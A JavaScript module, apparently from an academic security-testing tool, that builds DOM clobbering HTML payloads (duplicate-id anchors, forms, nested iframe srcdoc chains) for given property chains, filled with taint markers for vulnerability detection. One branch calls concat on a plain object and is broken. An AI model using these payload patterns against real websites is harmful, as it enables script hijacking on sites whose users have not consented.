
/*
    Copyright (C) 2022  Soheil Khodayari, CISPA
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.
    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.


    Description:
    ------------
    HTML Payload Generation for Clobbering DOMC Sources
*/



/**
 * DOMClobberingPayloadGenerator
 * @constructor
 */
function DOMClobberingPayloadGenerator() {
    "use strict";
}



/**
 * create_dom_clobbering_html_payload(statement)
 * @method proto
 * @param statement: {
 *		"id": integer
 *		"code": "window.x.y",
 *		"location": {start:{line:1, column:0}, end:{line:10, column:0}}
 *	}
 * @return an object containing (1) the taint value, and (2) the clobbering payload if clobberable, otherwise an empty string.
 */
DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = function (statement){

	let output = {};

	if(statement.location && statement.location.start){
		var slug = statement.location.start.line + '_' + statement.location.end.line;
	}else if (typeof statement.location === 'number' || typeof statement.location === 'string') {
		var slug = statement.location;
	}else{
		var slug = 'unknown_loc';
	}

	const taint_value = "TAINT_" + statement.code.replace(/\./g, '_') + '_' + slug;
	const code_targets = statement.code.split('.');
	const clobbering_value = `clobbered:${taint_value}`;
	output.taint_value = taint_value;
	output.clobbering_delay = false; // whether script delay is required for the clobbering, e.g., for iframe chains


	if(code_targets.length === 0){
		return output;
	}


	const chainIframes = function(clobbering_target, n){
        if (clobbering_target.length - 1 === n){
            return `<a id='${clobbering_target[n]}'${clobbering_value ? ` href='${clobbering_value}'` : ''}></a>`
        }

        let html = `<iframe name=${clobbering_target[n]} srcdoc="\n${"  ".repeat(n + 1) + chainIframes(clobbering_target, n + 1) + "\n" + "  ".repeat(n)}"></iframe>`;

        if (n === 1) html = html.replace(/"/g, '&quot;')
        else if (n > 1) html = html.replace(/"/g, '&quot;').replace(/&/g, "&amp;");

        return html;
    }


	
	
 	// ---------------------------
	// CASE 1: window.X OR X
	// ---------------------------
	if(code_targets[0] !== 'document')
	{
		/*
		- up to 2 levels: clobber with HTMLCollections (nodes with same id)
		- three levels & last level is predefined attributes: 
				x.y.src: <video id=x><video id=x name=y src=malicious> (ALSO with <sript>, or <audio>)
				x.y.value: <form id=x><input id=y value=malicious>
				x.y.href = <a id=x><a id=x name=y href=malicious>
		- other cases >= three levels : iframe chains
		*/

		if(code_targets[0] !== 'window')
		{
			// add the window object to the beginning to 
			// handle both the case of `window.x.y` and `x.y` together
			code_targets.unshift('window');
		}
		const code_targets_length = code_targets.length;

		if(code_targets_length === 1){
			// cannot clobber window alone;
			let payload = ""; 
			output.payload = payload;
		}
		else if(code_targets_length === 2)
		{
			// CASE 1.1: window.x
			let payload = `<a id="${code_targets[1]}" href="${clobbering_value}"></a>`;
			output.payload = payload;
		}
		else if(code_targets_length === 3)
		{
			// CASE 1.2: window.x.y
			let payload = `<a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}"></a>`;
			output.payload = payload;
		}
		else if(code_targets_length === 4 && code_targets[3] === 'src')
		{
			// CASE 1.3: window.x.y.src
			let payload = `<video id="${code_targets[1]}"></video><video id="${code_targets[1]}" name="${code_targets[2]}" src="${taint_value}"></video>`;
			output.payload = payload;			
		}
		else if(code_targets_length === 4 && code_targets[3] === 'value')
		{
			// CASE 1.4: window.x.y.value
			let payload = `<form id="${code_targets[1]}"><input type="text" id="${code_targets[2]}" value="${taint_value}"/></form>`;
			output.payload = payload;			
		}
		else if(code_targets_length === 4 && code_targets[3] === 'href')
		{
			// CASE 1.5: window.x.y.href
			let payload = `<a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}"></a>`;
			output.payload = payload;
		}
		
		else if (code_targets_length === 4) 
		{
			// CASE 1.6: window.x.y.z
			let payload = `<form id="${code_targets[1]}"><form id="${code_targets[1]}" name="${code_targets[2]}"> <input name="${code_targets[3]}" value="${clobbering_value}"/></form>`;
			output.payload = payload
		}
		
		else if (code_targets_length === 5) 
		{
			// CASE 1.7: window.x.y.z.w
			output.clobbering_delay = true;
			let last_src_doc = `<a id=${code_targets[code_targets_length-2]}></a><a id=${code_targets[code_targets_length-2]} name=${code_targets[code_targets_length-1]} href=${clobbering_value}></a>`;
			let payload = `<iframe name="${code_targets[1]}" srcdoc="<iframe name='${code_targets[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
			output.payload = payload
		}
		
		else if (code_targets_length === 6 && code_targets[5] === 'href') 
		{
			// CASE 1.8: window.x.y.z.w.href
			output.clobbering_delay = true;
			let last_src_doc = `<a id=${code_targets[code_targets_length-2]}></a><a id=${code_targets[code_targets_length-2]} name=${code_targets[code_targets_length-1]} href=${clobbering_value}></a>`;
			let payload = `<iframe name="${code_targets[1]}" srcdoc="<iframe name='${code_targets[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
			output.payload = payload
		}
		
		else
		{
			// CASE 1.9: for higher levels, recursively chain iframes to create nested frames of length n
			let payload= chainIframes(code_targets, 0);
			output.payload=payload;
		}
		

	} 

	// ---------------------------
	// CASE 2: document.X 
	// ---------------------------
	else
	{
		const code_targets_length = code_targets.length;
		if(code_targets_length === 1){
			// cannot clobber document object alone;
			const payload = ""; 
			output.payload = payload;
		}

		else if(code_targets_length === 2){
			// CASE 2.1: document.x
			let payload = `<img name="${code_targets[1]}" src="${clobbering_value}"></img>`;
			output.payload = payload;
		}

		else if(code_targets_length === 3){
			// CASE 2.2: document.x.y
			let payload = `<form name="${code_targets[1]}"><img name="${code_targets[2]}" src="${clobbering_value}"></form>`;
			output.payload = payload;
		}
		
		else if(code_targets_length === 4){
			// CASE 2.3: document.x.y.z
			let payload = `<form id="${code_targets[1]}">\n<form id="${code_targets[1]}" name="${code_targets[2]}">\n <input name="${code_targets[3]}" value="${clobbering_value}">\n</form>`;
			output.payload = payload;
		}

		else {
			// CASE 2.4: higher levels
			let payload=chainIframes(code_targets, 0);
			output = output.concat([payload]);

		}

	}

	return output;


}



module.exports = {
	DOMClobberingPayloadGenerator: DOMClobberingPayloadGenerator
}



